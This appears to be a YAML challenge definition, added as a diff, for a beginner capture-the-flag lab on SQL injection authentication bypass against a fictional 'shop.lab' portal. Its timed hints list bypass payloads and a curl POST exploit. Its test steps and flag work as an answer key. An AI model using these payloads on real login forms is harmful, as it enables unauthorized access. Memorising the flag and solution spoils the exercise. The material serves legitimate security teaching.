@@ -1,0 +1,195 @@
+name: Basic SQL Injection (Login)
+description: ShopSecure has hired you to test their employee portal login system. Investigate the authentication mechanism for SQL injection vulnerabilities.
+difficulty: beginner
+category: web
+duration_minutes: 120
+objectives:
+  - Understand SQL injection vulnerabilities in authentication
+  - Identify SQL injection in login forms
+  - Exploit basic SQL injection to bypass authentication
+  - Access user dashboard and extract sensitive information
+  - Capture the flag
+
+scenario: |
+  ShopSecure, a local e-commerce startup, has hired you as a security consultant to 
+  perform a penetration test on their employee portal. The company's CTO, Michael 
+  Rodriguez, is concerned about the security of their authentication system and wants 
+  you to test it for vulnerabilities.
+  
+  ShopSecure's employee portal is accessible at shop.lab. The login page requires 
+  employees to enter their username and password to access their dashboard. Michael 
+  suspects the authentication code might not be properly sanitizing user input.
+  
+  Your objective: Test the login functionality for SQL injection vulnerabilities. 
+  Attempt to bypass authentication and gain unauthorized access to user accounts. 
+  If successful, access the admin account to retrieve sensitive information and the flag.
+
+hostnames:
+  - ip_offset: "23"
+    hostname: "shop.lab"
+    description: "Vulnerable e-commerce application"
+  - ip_offset: "31"
+    hostname: "db.lab"
+    description: "MySQL database server (internal)"
+
+
+
+flag: "OCR{sql_1nj3ct10n_g3t_b4s1c}"
+
+hints:
+  - text: |
+      **SQL injection (SQLi)** is a vulnerability that occurs when untrusted user input is inserted into SQL queries without proper validation or sanitization. This allows attackers to manipulate database queries.
+
+      **How SQL injection works:**
+      1. Application builds SQL query using user input
+      2. Attacker provides malicious input that changes query logic
+      3. Database executes the modified query
+      4. Attacker gains unauthorized access or extracts data
+
+      **Common targets:**
+      - Login forms (authentication bypass)
+      - Search fields
+      - URL parameters
+      - Any input that goes into a database query
+
+      Your goal is to identify and exploit SQL injection in the ShopSecure login form to gain unauthorized access.
+    unlock_after_minutes: 0
+
+  - text: |
+      **SQL injection in authentication** typically involves bypassing login logic by injecting SQL that makes the query always return true.
+
+      **Vulnerable SQL query example:**
+      ```sql
+      SELECT * FROM users WHERE username='$user' AND password='$pass'
+      ```
+
+      **Normal input:**
+      - Username: `admin`
+      - Password: `password123`
+      - Query: `SELECT * FROM users WHERE username='admin' AND password='password123'`
+
+      **Malicious input:**
+      - Username: `admin' OR '1'='1`
+      - Password: (anything)
+      - Query: `SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'`
+
+      The `OR '1'='1'` makes the condition always true, bypassing authentication.
+    unlock_after_minutes: 5
+
+  - text: |
+      **Detecting SQL injection** starts with testing for errors or unexpected behavior.
+
+      **Basic SQLi detection tests:**
+      1. Single quote: `'` - Causes SQL syntax error if vulnerable
+      2. Comment characters: `--` or `#` - Comments out rest of query
+      3. Boolean tests: `' OR '1'='1` - Always true condition
+      4. Time delays: `' OR SLEEP(5)--` - Delays response if vulnerable
+
+      Try entering a single quote (`'`) in the username field. If you get:
+      - **SQL error**: Definitely vulnerable
+      - **Different behavior**: Possibly vulnerable
+      - **Normal response**: Might be filtering input (try other techniques)
+    unlock_after_minutes: 10
+
+  - text: |
+      Common **SQL injection authentication bypass payloads**:
+
+      **Username field:**
+      - `admin' --`
+      - `admin'#`
+      - `admin' OR '1'='1`
+      - `admin' OR '1'='1'--`
+      - `admin' OR 1=1--`
+      - `' OR '1'='1`
+
+      **How these work:**
+      - `--` and `#` comment out the rest of the query (including password check)
+      - `OR '1'='1'` makes the WHERE clause always true
+      - Combining both ensures the query succeeds
+
+      The password field becomes irrelevant because the query logic is broken.
+    unlock_after_minutes: 15
+
+  - text: |
+      **Testing SQL injection on ShopSecure:**
+
+      1. **Navigate to the login page** at `http://shop.lab`
+
+      2. **Try basic injection in username field:**
+         - Enter: `admin' --`
+         - Password: (anything, e.g., `test`)
+         - Submit the form
+
+      3. **Observe the response:**
+         - Success: You're logged in (injection worked!)
+         - Error message: Try different payload
+         - Normal login failure: Try other variations
+
+      The `--` comments out the password check, so the query becomes:
+      ```sql
+      SELECT * FROM users WHERE username='admin' --' AND password='test'
+      ```
+      Which effectively is:
+      ```sql
+      SELECT * FROM users WHERE username='admin'
+      ```
+    unlock_after_minutes: 20
+
+  - text: |
+      If basic payloads don't work, try **alternative syntax**:
+
+      ```
+      Username variations:
+      - admin'#
+      - admin' OR 1=1#
+      - admin' OR 1=1--
+      - admin' OR 'a'='a
+      - ' OR '1'='1'--
+      - ') OR ('1'='1
+      ```
+
+      **Different SQL comment styles:**
+      - MySQL: `#` or `-- ` (note the space after dashes)
+      - Other DBs: `--` or `/* */`
+
+      The ShopSecure login form submits credentials as an HTTP POST request with `username` and `password` form fields. Inspect the request in your browser developer tools or Burp Suite to confirm the method and parameter names before crafting a payload.
+    unlock_after_minutes: 25
+
+  - text: |
+      **After successful bypass:**
+
+      Once logged in via SQL injection:
+      1. Navigate the application as an authenticated user
+      2. Look for admin functionality or sensitive data
+      3. Check the dashboard, profile, or admin panel
+      4. The flag will be displayed on the authenticated page
+
+      **Expected workflow:**
+      1. Access login page: `http://shop.lab`
+      2. Inject payload in username: `admin' --` or `admin'#`
+      3. Any password (it's bypassed)
+      4. Submit and gain access
+      5. View the dashboard to find the flag
+
+      **Note**: The login form is a POST request, so type the payload directly into the username field in the browser or send it with `curl`:
+
+      ```bash
+      curl -s -X POST http://shop.lab/ -d "username=admin' OR '1'='1'-- -&password=anything"
+      ```
+
+      When sending a POST body with curl, the `&` separates form fields and curl handles the encoding of the form data for you.
+    unlock_after_minutes: 30
+
+workbook: "wiki/range/webpt/CH_WEB02_Web_Exploitation/01_Basic_SQL_Injection/"
+
+test:
+  steps:
+    - name: "Web server responds with login page"
+      command: "curl -s http://{target.webserver}/ | grep -o 'ShopSecure'"
+      expect: "ShopSecure"
+    - name: "Login form rejects invalid credentials"
+      command: "curl -s -X POST http://{target.webserver}/ -d 'username=fake&password=fake' | grep -o 'Invalid username or password'"
+      expect: "Invalid username or password"
+    - name: "SQL injection bypasses authentication and reveals flag"
+      command: "curl -s -X POST http://{target.webserver}/ -d \"username=admin'-- &password=anything\" | grep -o 'OCR{[^}]*}'"
+      expect: "OCR{sql_1nj3ct10n_g3t_b4s1c}"
